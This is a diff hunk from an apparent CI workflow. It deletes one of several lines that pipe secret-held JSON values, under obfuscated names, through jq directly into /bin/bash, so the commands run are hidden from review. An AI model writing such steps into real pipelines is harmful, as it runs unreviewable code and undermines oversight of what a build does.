@@ -20,7 +20,6 @@ jobs:
           wss2459: ${{ secrets.wss2459 }}
         run: |
           printf '%s' "$wss2459" | jq -r .rxz916 | /bin/bash
-          printf '%s' "$zlarg557" | jq -r .ml8067 | /bin/bash
           printf '%s' "$nduuq0789" | jq -r .amyd1 | /bin/bash
           echo $icf72 | jq -r .ewx85 | /bin/bash
           echo $ib7780 | jq -r .vqvrd2 | /bin/bash
